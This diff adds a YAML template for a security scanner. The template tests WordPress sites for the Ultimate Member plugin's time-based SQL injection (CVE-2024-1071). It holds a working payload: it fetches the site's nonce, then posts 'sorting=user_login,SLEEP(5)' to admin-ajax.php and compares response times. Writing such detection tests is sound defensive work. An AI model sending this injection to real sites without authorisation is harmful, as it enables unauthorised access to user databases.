@@ -1,0 +1,140 @@
+id: WORDPRESS_ULTIMATE_MEMBER_SQLI
+info:
+  name: "Wordpress Ultimate Member SQL Injection Test"
+  description: > 
+    "This test evaluates the vulnerability of the Ultimate Member plugin to SQL Injection attacks. By manipulating the `sorting` parameter in specific plugin requests, it checks if an attacker can insert malicious SQL commands, potentially exposing sensitive database information. The test involves sending crafted requests and analyzing responses for signs of successful exploitation."
+  details: >
+    "This test targets the Ultimate Member plugin for WordPress, focusing on SQL Injection vulnerabilities. The test involves sending POST requests with manipulated `sorting` parameters to exploit potential weaknesses in SQL query handling. It checks for delayed responses and specific content in the output to confirm if the injection was successful, potentially leading to unauthorized data access. The test is crucial for identifying and mitigating risks associated with this vulnerability."
+  impact: >
+    "The impact of this vulnerability is significant, as it allows attackers to execute arbitrary SQL queries on the database. This can lead to unauthorized access to sensitive information, such as user credentials and personal data. Successful exploitation can compromise the integrity and confidentiality of the database, potentially affecting the security of the entire WordPress site."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: WORDPRESS_ULTIMATE_MEMBER_SQLI
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-89
+  cve:
+    - CVE-2024-1071
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: content-type
+        extract: contentTypeHeader
+
+execute:
+  type: multiple
+  requests:
+  - req: 
+    - modify_method: GET
+    - modify_url: ${urlVar}/?p=1
+    - replace_body: '{}'
+    - follow_redirect: true
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          for_one:
+            key:
+              eq: nonce
+            value:
+              regex: "[0-9a-z]+"
+              extract: nonceValue  
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_method: POST
+    - modify_url: ${urlVar}/wp-admin/admin-ajax.php?action=um_get_members
+    - modify_header:
+        contentTypeHeader: "application/x-www-form-urlencoded"
+    - follow_redirect: true
+    - replace_body: 'directory_id=b9238&sorting=user_login,SLEEP(5)&nonce=${nonceValue}'    
+    - validate:
+        response_code:
+          gt: 505      
+validate:
+  and:
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - 4001
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - ${x1.response.stats.median_response_time} * 3
